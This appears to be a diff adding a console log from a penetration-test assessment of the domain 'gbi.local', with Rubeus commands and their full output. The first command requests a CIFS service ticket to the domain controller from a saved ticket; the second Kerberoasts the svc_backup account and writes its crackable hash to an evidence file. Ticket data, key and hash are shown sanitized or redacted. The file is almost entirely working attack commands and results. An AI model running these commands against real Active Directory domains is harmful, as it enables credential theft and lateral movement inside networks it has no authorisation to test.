@@ -1,0 +1,50 @@
+C:\Tools\Rubeus>Rubeus.exe asktgs /service:cifs/dc01.gbi.local /ticket:C:\Evidence\gbi-assessment-user.kirbi /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.3
+
+[*] Action: Ask TGS
+
+[*] Using domain controller: dc01.gbi.local (10.40.10.12)
+[*] Requesting service ticket for: cifs/dc01.gbi.local
+[*] Using cached TGT for: assessment.user@GBI.LOCAL
+[*] Building TGS-REQ request for service: 'cifs/dc01.gbi.local'
+[+] TGS request successful!
+[*] base64(ticket.kirbi):
+
+      doIF2DCCBdSgAwIBBaEDAgEWooIE5TCCBOFhggTdMIIE2aADAgEFoQsbCUdCSS5MT0NB
+      TCMSMBCgAwIBAqEJMAcbBWNpZnOjggSxMIIEraADAgESoQMCAQKiggSfBIIEm3Nhbml0
+      aXplZC1kZW1vLXRpY2tldC1kYXRhLW5vdC1hLXJlYWwta2VyYmVyb3MtdGlja2V0LWZv
+      ci1kb2N1bWVudGF0aW9uLWFuZC10ZXN0aW5nLW9ubHkuLi4uUkVEQUNURUQuLi4u
+
+  ServiceName              :  cifs/dc01.gbi.local
+  ServiceRealm             :  GBI.LOCAL
+  UserName                 :  assessment.user
+  UserRealm                :  GBI.LOCAL
+  StartTime                :  7/8/2026 3:18:42 PM
+  EndTime                  :  7/9/2026 1:18:42 AM
+  RenewTill                :  7/15/2026 3:18:11 PM
+  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  REDACTED_FOR_DEMO_EVIDENCE
+
+[*] Ticket written to C:\Evidence\assessment.user_cifs_dc01.gbi.local.kirbi
+
+C:\Tools\Rubeus>Rubeus.exe kerberoast /user:svc_backup /domain:gbi.local /dc:dc01.gbi.local /nowrap
+
+[*] Action: Kerberoasting
+[*] Target User            : svc_backup
+[*] Target SPN             : MSSQLSvc/fs01.gbi.local:1433
+[*] Using domain controller: dc01.gbi.local (10.40.10.12)
+[+] Ticket successfully requested!
+
+$krb5tgs$23$*svc_backup$GBI.LOCAL$MSSQLSvc/fs01.gbi.local:1433*$REDACTED_SANITIZED_HASH_MATERIAL
+
+[*] Roasted hashes written to C:\Evidence\gbi-kerberoast.txt
+[*] Completed in 00:00:01.684
